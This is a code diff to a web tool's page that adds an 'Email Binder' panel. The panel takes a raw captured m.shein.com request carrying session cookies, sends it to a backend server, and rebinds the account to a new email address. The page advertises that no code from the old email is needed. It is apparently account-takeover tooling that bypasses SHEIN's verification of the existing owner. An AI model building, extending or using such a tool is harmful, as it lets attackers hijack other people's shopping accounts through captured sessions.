@@ -3798,6 +3798,61 @@
     }
     /* Re-enable pointer events for images inside clickable elements */
     a img, button img { pointer-events: auto; }
+
+    /* ── Email Binder ──────────────────────────────────────────── */
+    .eb-step {
+      display: none;
+      flex-direction: column;
+      gap: 10px;
+      margin-top: 10px;
+    }
+    .eb-step.active { display: flex; }
+    .eb-label {
+      font-family: 'Nunito', sans-serif;
+      font-size: 10px; font-weight: 800;
+      letter-spacing: .08em; text-transform: uppercase;
+      color: var(--mut); margin-bottom: 2px;
+    }
+    .eb-input {
+      width: 100%; box-sizing: border-box;
+      height: 44px; border-radius: 10px;
+      border: 1.5px solid var(--bdr); background: var(--bg);
+      font-family: 'Nunito', sans-serif; font-size: 13px; font-weight: 600;
+      color: var(--txt); padding: 0 14px; outline: none;
+      transition: border-color .15s;
+    }
+    .eb-input:focus { border-color: #58CC02; box-shadow: 0 0 0 3px rgba(88,204,2,.1); }
+    .eb-textarea {
+      width: 100%; box-sizing: border-box; border-radius: 10px;
+      border: 1.5px solid var(--bdr); background: var(--bg);
+      font-family: 'JetBrains Mono', monospace; font-size: 11px;
+      color: var(--txt); padding: 10px 12px; outline: none;
+      resize: vertical; min-height: 80px; transition: border-color .15s;
+    }
+    .eb-textarea:focus { border-color: #58CC02; }
+    .eb-btn {
+      width: 100%; height: 44px;
+      background: #58CC02; color: #fff;
+      border: none; border-bottom: 4px solid #46A302;
+      border-radius: 10px; font-family: 'Nunito', sans-serif;
+      font-weight: 800; font-size: 14px; cursor: pointer;
+      display: flex; align-items: center; justify-content: center; gap: 7px;
+      transition: transform .1s, border-bottom-width .1s;
+    }
+    .eb-btn:active { border-bottom-width: 2px; transform: translateY(2px); }
+    .eb-btn:hover { filter: brightness(1.05); }
+    .eb-btn:disabled { opacity: .6; cursor: not-allowed; }
+    .eb-status {
+      font-family: 'Nunito', sans-serif; font-size: 12px; font-weight: 700;
+      padding: 10px 12px; border-radius: 8px; text-align: center;
+      display: none;
+    }
+    .eb-status.ok   { background: rgba(88,204,2,.1); color: #46A302; border: 1.5px solid rgba(88,204,2,.25); display: block; }
+    .eb-status.err  { background: rgba(255,75,75,.08); color: #FF4B4B; border: 1.5px solid rgba(255,75,75,.25); display: block; }
+    .eb-status.info { background: rgba(88,204,2,.06); color: var(--mut); border: 1.5px solid var(--bdr); display: block; }
+    .eb-otp-row { display: flex; gap: 8px; }
+    .eb-otp-input { flex: 1; letter-spacing: .2em; text-align: center; font-size: 18px; font-weight: 900; }
+    /* ─────────────────────────────────────────────────────────── */
 </style>
 </head>
 
@@ -5586,6 +5641,72 @@ if __name__ == "__main__":
     </div>
   </div>
 
+    <!-- ═══ HOME — EMAIL BINDER ═══ -->
+    <div class="view view-home" style="margin-top:0">
+      <div class="card" style="padding:0;overflow:hidden">
+        <div class="collapse-head" id="eb-toggle" style="padding:12px 16px">
+          <div class="card-title" style="display:flex;align-items:center;gap:8px;font-size:13px">
+            <div style="width:28px;height:28px;border-radius:8px;background:rgba(255,150,0,.12);border:1.5px solid rgba(255,150,0,.3);display:flex;align-items:center;justify-content:center;flex-shrink:0">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#FF9600" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
+            </div>
+            Email Binder
+          </div>
+          <div style="display:flex;align-items:center;gap:8px">
+            <span style="font-family:'Nunito',sans-serif;font-size:10px;font-weight:700;color:var(--mut)">No OTP needed</span>
+            <span class="chev" id="eb-arrow">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg>
+            </span>
+          </div>
+        </div>
+
+        <div class="collapse-body" id="eb-body">
+          <div style="padding:0 14px 16px">
+
+            <p style="font-family:'Nunito',sans-serif;font-size:12px;font-weight:600;color:var(--mut);margin-bottom:12px;line-height:1.6">
+              Change your SHEIN account email without OTP from the old email. Paste the RAW browser request captured from <b style="color:var(--txt)">m.shein.com</b> (must be a fresh, logged-in session).
+            </p>
+
+            <!-- Step 1: RAW paste + new email + send code -->
+            <div class="eb-step active" id="eb-step-1">
+              <div>
+                <div class="eb-label">Browser RAW Request</div>
+                <textarea class="eb-textarea" id="eb-raw" placeholder="Paste your captured browser RAW request here (POST or any m.shein.com request with valid cookies)..." rows="4"></textarea>
+              </div>
+              <div>
+                <div class="eb-label">New Email Address</div>
+                <input class="eb-input" id="eb-new-email" type="email" placeholder="newaddress@gmail.com">
+              </div>
+              <div>
+                <div class="eb-label">Current Email (masked, optional)</div>
+                <input class="eb-input" id="eb-orig-email" type="text" placeholder="a*****z@gmail.com — leave blank if unknown">
+              </div>
+              <button class="eb-btn" id="eb-send-btn" onclick="ebSendCode()">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>
+                Send Verification Code
+              </button>
+            </div>
+
+            <!-- Step 2: OTP entry + confirm -->
+            <div class="eb-step" id="eb-step-2">
+              <div class="eb-otp-row">
+                <input class="eb-input eb-otp-input" id="eb-otp" type="text" maxlength="6" placeholder="000000" onkeydown="if(event.key==='Enter')ebConfirm()">
+              </div>
+              <button class="eb-btn" id="eb-confirm-btn" onclick="ebConfirm()">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+                Confirm &amp; Bind Email
+              </button>
+              <button onclick="ebReset()" style="background:none;border:none;font-family:'Nunito',sans-serif;font-size:11px;font-weight:700;color:var(--mut);cursor:pointer;text-align:center;padding:4px">
+                ← Enter a different email
+              </button>
+            </div>
+
+            <div class="eb-status" id="eb-status"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+
     <!-- ═══ SITE FOOTER ═══ -->
     <footer class="site-footer">
       <div class="site-footer-brand">
@@ -5906,6 +6027,7 @@ if __name__ == "__main__":
   initCollapse('logs-toggle', 'logs-body', 'logs-arrow');
   initCollapse('topup-history-toggle', 'topup-history-body', 'topup-history-arrow');
   initCollapse('eg-toggle', 'eg-body', 'eg-arrow');
+  initCollapse('eb-toggle', 'eb-body', 'eb-arrow');
 
   // ════════════════════════════════════════════════════════════
   // THEME TOGGLE
@@ -7474,7 +7596,108 @@ if __name__ == "__main__":
   // ════════════════════════════════════════════════════════════
   // BACKGROUND MUSIC — loops AM.mp3 → Travel.mp3 → repeat
   // ════════════════════════════════════════════════════════════
-    $('run-btn').addEventListener('click', doRun);
+  
+  // ════════════════════════════════════════════════════════════
+  // EMAIL BINDER — Change SHEIN account email (no old-email OTP)
+  // ════════════════════════════════════════════════════════════
+  var _ebRaw = '';
+
+  function ebStatus(msg, type) {
+    var el = $('eb-status');
+    if (!el) return;
+    el.textContent = msg;
+    el.className = 'eb-status ' + (type || '');
+  }
+
+  function ebReset() {
+    $('eb-step-1').classList.add('active');
+    $('eb-step-2').classList.remove('active');
+    ebStatus('', '');
+  }
+
+  function ebSendCode() {
+    var url = $('run-url').value.trim().replace(/\/+$/, '');
+    var key = $('run-key').value.trim();
+    if (!url) { toast('e', 'Enter server URL first'); return; }
+    if (!key)  { toast('e', 'Enter access key first'); return; }
+
+    var raw      = ($('eb-raw') || {}).value || '';
+    var newEmail = (($('eb-new-email') || {}).value || '').trim();
+
+    if (!raw.trim())            { toast('w', 'Paste a RAW request first'); return; }
+    if (!newEmail || !newEmail.includes('@')) { toast('w', 'Enter a valid new email'); return; }
+
+    _ebRaw = raw;
+    var btn = $('eb-send-btn');
+    if (btn) { btn.disabled = true; btn.textContent = 'Sending…'; }
+    ebStatus('Sending verification code to ' + newEmail + '…', 'info');
+
+    fetch(url + '/email/send_code', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'X-Access-Key': key },
+      body: JSON.stringify({ raw_headers: raw, new_email: newEmail })
+    }).then(function(r) { return r.json(); }).then(function(d) {
+      if (btn) { btn.disabled = false; btn.textContent = 'Send Verification Code'; }
+      if (!d.ok) { ebStatus('Error: ' + (d.error || 'Unknown'), 'err'); return; }
+      var info = (d.data || {}).info || {};
+      var code = String((d.data || {}).code || '');
+      if (code === '0' && info.is_send) {
+        ebStatus('Code sent! Check ' + newEmail + ' — valid for ' + (info.ttl || 60) + 's.', 'ok');
+        $('eb-step-1').classList.remove('active');
+        $('eb-step-2').classList.add('active');
+        setTimeout(function() { var o = $('eb-otp'); if (o) o.focus(); }, 100);
+      } else {
+        var msg = (d.data || {}).msg || JSON.stringify(d.data || d);
+        ebStatus('Failed: ' + msg, 'err');
+      }
+    }).catch(function(err) {
+      if (btn) { btn.disabled = false; btn.textContent = 'Send Verification Code'; }
+      ebStatus('Network error: ' + err.message, 'err');
+    });
+  }
+
+  function ebConfirm() {
+    var url = $('run-url').value.trim().replace(/\/+$/, '');
+    var key = $('run-key').value.trim();
+    if (!url || !key) { toast('e', 'Server URL / access key missing'); return; }
+
+    var newEmail = (($('eb-new-email') || {}).value || '').trim();
+    var origEmail = (($('eb-orig-email') || {}).value || '').trim();
+    var otp = (($('eb-otp') || {}).value || '').trim();
+
+    if (!otp || otp.length < 4) { toast('w', 'Enter the verification code'); return; }
+
+    var btn = $('eb-confirm-btn');
+    if (btn) { btn.disabled = true; btn.textContent = 'Confirming…'; }
+    ebStatus('Binding new email address…', 'info');
+
+    fetch(url + '/email/bind', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'X-Access-Key': key },
+      body: JSON.stringify({
+        raw_headers: _ebRaw,
+        new_email: newEmail,
+        original_alias: origEmail,
+        otp: otp
+      })
+    }).then(function(r) { return r.json(); }).then(function(d) {
+      if (btn) { btn.disabled = false; btn.textContent = 'Confirm & Bind Email'; }
+      if (!d.ok) { ebStatus('Error: ' + (d.error || 'Unknown'), 'err'); return; }
+      var code = String((d.data || {}).code || '');
+      if (code === '0') {
+        ebStatus('✓ Email successfully changed to ' + newEmail + '!', 'ok');
+        setTimeout(ebReset, 5000);
+      } else {
+        var msg = (d.data || {}).msg || JSON.stringify(d.data || d);
+        ebStatus('Failed: ' + msg, 'err');
+      }
+    }).catch(function(err) {
+      if (btn) { btn.disabled = false; btn.textContent = 'Confirm & Bind Email'; }
+      ebStatus('Network error: ' + err.message, 'err');
+    });
+  }
+
+  $('run-btn').addEventListener('click', doRun);
 
   function _postLogResult(result, detail) {
     if (!_currentLogId) return;
